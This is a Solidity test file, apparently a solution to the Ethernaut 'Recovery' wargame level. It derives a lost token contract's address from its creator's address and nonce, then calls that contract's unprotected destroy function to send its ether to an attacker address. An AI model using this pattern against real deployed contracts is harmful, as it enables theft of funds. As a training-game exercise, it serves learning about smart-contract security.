// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";

import {Recovery, SimpleToken} from "ethernaut/levels/Recovery.sol";
import {RecoveryFactory} from "ethernaut/levels/RecoveryFactory.sol";

// import {Dex2Attacker} from "../src/Dex2/Dex2Attacker.sol";

contract DexTwoTest is Test {
    address public recoveryInstance;
    RecoveryFactory public factory = new RecoveryFactory();

    // address public dex2attacker = address(new Dex2Attacker());

    // address public owner = address(0x3000);
    address public attacker = address(0x2000);

    function setUp() public {
        recoveryInstance = factory.createInstance{value: 0.001 ether}(attacker);
    }

    function testAttack() external {
        vm.startPrank(attacker);

        address calAddr = address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            uint8(0xd6),
                            uint8(0x94),
                            recoveryInstance,
                            uint8(0x01)
                        )
                    )
                )
            )
        );

        SimpleToken(payable(calAddr)).destroy(payable(attacker));

        factory.validateInstance(payable(recoveryInstance), address(0));
    }
}
